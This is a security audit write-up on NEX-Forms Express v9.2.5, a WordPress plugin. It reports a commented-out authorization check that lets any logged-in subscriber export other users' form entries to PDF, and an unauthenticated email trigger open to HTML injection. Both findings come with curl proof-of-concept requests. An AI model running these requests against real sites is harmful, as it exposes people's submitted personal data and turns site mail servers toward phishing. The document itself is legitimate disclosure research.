# NEX-Forms Express v9.2.5 — Commented-Out Auth Check (BAC) + Unauth Email Trigger

**Plugin:** nex-forms-express-wp-form-builder v9.2.5 (6,000+ installs)
**Date:** 2026-08-29
**Prior CVEs:** None found for this version
**Findings:** 1 confirmed BAC (commented-out auth), 1 unauth email trigger, several non-exploitable patterns

## Finding 1: BAC on `print_to_pdf` — Commented-Out Auth Check (CONFIRMED)

**File:** `includes/classes/class.dashboard.php:5761-5774`

### Vulnerable Code

```php
public function print_to_pdf()
{
    //if(!current_user_can( NF_USER_LEVEL ))   // <-- COMMENTED OUT
    //      wp_die();                           // <-- COMMENTED OUT
    if (function_exists('NEXForms_export_to_PDF'))
    {
        NEXForms_clean_echo( NEXForms_export_to_PDF(sanitize_text_field($_POST['form_entry_Id']), true, true));
    }
```

### Registration

```php
// class.dashboard.php:1811
add_action('wp_ajax_nf_print_to_pdf', array($this,'print_to_pdf'));
// class.dashboard.php:1821 — nopriv is COMMENTED OUT
//add_action('wp_ajax_nopriv_nf_print_to_pdf', array($this,'print_to_pdf'));
```

### Auth Status

- Nopriv registration: commented out (authenticated-only at the WP AJAX layer)
- In-function `current_user_can()`: **also commented out** (lines 5763-5764)
- Result: Any logged-in user (including subscribers) can call this and generate PDFs of **any** form entry by supplying an arbitrary `form_entry_Id`. Form entries contain submitted user data (potential PHI/PII).

### PoC

```bash
# As a subscriber (any authenticated low-priv user)
curl -X POST 'http://target/wp-admin/admin-ajax.php' \
  -H 'Cookie: <wordpress_logged_in_subscriber_cookie>' \
  -d 'action=nf_print_to_pdf&form_entry_Id=1'
```

### Exploitability

High. Any authenticated low-priv user can export arbitrary form entries to PDF. Meets Patchstack "BAC on secrets" criteria (form entries = sensitive submitted data).

### Contrast: `print_report_to_pdf` is properly protected

```php
// class.dashboard.php:5800-5813
public function print_report_to_pdf()
{
    if(!current_user_can( NF_USER_LEVEL ))   // ACTIVE check
        wp_die();
    // ...
}
```

This is the critical difference — `print_to_pdf` had its auth check commented out but `print_report_to_pdf` did not. Same developer, same file, one protected and one not.

## Finding 2: Unauth Email Triggering via `nf_send_nf_email` (By Design but Abusable)

**File:** `main.php:2693-2694` (registration), `main.php:4811` (function)

### Vulnerable Code

```php
add_action( 'wp_ajax_nopriv_nf_send_nf_email', 'nf_send_mail');

function nf_send_mail($nex_forms_id='', $entry_id='', ...){
    $data_array = $_POST;
    if($_POST['send_nf_email']=='1')
    {
        $nex_forms_id = sanitize_title($_POST['set_nex_forms_Id']);
        $data_array = $_POST['data'];   // attacker-controlled email body content
    }
    // ... fetches form config from DB, sends emails to form's configured recipients
```

### Auth Status

- NO nonce check
- NO auth check
- Unauthenticated users can trigger email sending

### PoC

```bash
curl -X POST 'http://target/wp-admin/admin-ajax.php' \
  -d 'action=nf_send_nf_email&send_nf_email=1&set_nex_forms_Id=1&data[field1]=attacker-content&page=test&ip=1.2.3.4&nex_forms_Id=1&company_url=&email=test@test.com'
```

### Exploitability

Medium. Recipients/subject/from-address come from DB config (not attacker-controlled), limiting impact. But the `real_val__` POST fields (line 4988) are used raw in email HTML body — enables HTML injection in outgoing emails. Spam amplification / phishing via site's mail server.

## Finding 3: `nf_resend_email` — Not Exploitable

When `resend_email==1`, `$entry_id` is never set from POST data, always defaults to empty string → cast to 0 by `%d` in prepare. Queries `Id = 0` → returns null. Cannot target specific entries.

## Patterns Checked and Found Non-Exploitable

### SQLi (16 query patterns reviewed — all safe)

| Line | Pattern | Why safe |
|------|---------|----------|
| 2142 | Unparameterized `'...WHERE nex_forms_Id = '.$id` | `$id` cast via `(int)` at assignment |
| 2761, 3001, 3031, 3065, 3098, 3250, 3256 | `$wpdb->prepare` with `%d` + `sanitize_text_field` | Properly parameterized |
| 4831, 4834 | `$wpdb->prepare` with `%d` | Non-numeric → cast to 0 |
| 3779, 3783 | String concat in CSV export | Protected by nonce + `manage_options` |

### File Upload in `submit_nex_form`

Uses `wp_handle_upload` with `test_form=>false` but does NOT set `test_type=>false`. WordPress's default mime-type checking rejects dangerous extensions (.php). File extension preserved in random filename but restricted to allowed mime types. Not directly exploitable for RCE.

### SSRF

`get_geo_location()` uses `wp_remote_get` to `ipinfo.io/{$_SERVER['REMOTE_ADDR']}` — IP from server variable, not user input. Zapier webhook URL from DB config. Not exploitable.

### eval/exec/system/passthru

None found in plugin code.

### LFI/RFI

No `include`/`require` with user-controlled paths.

## Key Audit Insight: The "Commented-Out Auth" Pattern

This audit revealed a pattern not previously documented: **developers commenting out auth checks during debugging and forgetting to re-enable them**. The telltale sign is:

```php
//if(!current_user_can( NF_USER_LEVEL ))
//      wp_die();
```

**Detection approach:**
```bash
grep -rn '//.*current_user_can\|//.*wp_die\|//.*is_admin\|//.*check_ajax' --include="*.php" <plugin_path>
```

This is distinct from "missing auth" (never had a check) — commented-out auth means the developer intended to protect the function but the protection is inactive. This pattern can appear in:
- `wp_ajax_` handlers (authenticated only at WP layer, but in-function check commented out → any logged-in user can access)
- `wp_ajax_nopriv_` handlers (if both the nopriv registration is active AND the in-function check is commented out → fully unauth)

**Always compare sibling functions in the same file.** In this case, `print_report_to_pdf` had an active auth check while `print_to_pdf` did not — comparing them immediately confirmed the vulnerability.

## Patchstack Submission Assessment

| Finding | Patchstack Category | Accepted? | Severity |
|---------|-------------------|-----------|----------|
| `print_to_pdf` BAC | Broken access control on secrets | Yes — form entries = sensitive submitted data | Medium-High |
| `nf_send_nf_email` unauth email | Not a standard accepted category | Likely rejected — email triggering without arbitrary recipient control | Low-Medium |
